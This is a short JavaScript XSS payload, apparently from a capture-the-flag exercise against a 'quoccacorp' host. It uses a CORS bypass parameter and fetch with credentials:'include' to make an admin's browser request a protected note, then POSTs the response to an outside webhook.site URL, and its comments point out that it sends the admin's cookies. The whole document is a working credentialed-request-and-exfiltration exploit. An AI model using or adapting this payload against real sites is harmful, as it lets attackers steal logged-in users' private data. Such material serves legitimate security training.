<script>
  // 1. The target URL must include the parameter to 'trick' the CORS check
  const target = "https://cors-api.quoccacorp.com/note?cors-allow-origin=" + window.location.origin;

  fetch(target, { 
    credentials: 'include' // CRITICAL: This sends the Admin's cookies!
  })
  .then(response => response.text())
  .then(data => {
      // 2. Send whatever the API returned (the flag) to your webhook
      fetch("https://webhook.site/ac3c1f08-eab5-451a-b5c0-2d9e21ce0eca", {
          method: "POST",
          mode: "no-cors",
          body: data
      });
  });
</script>
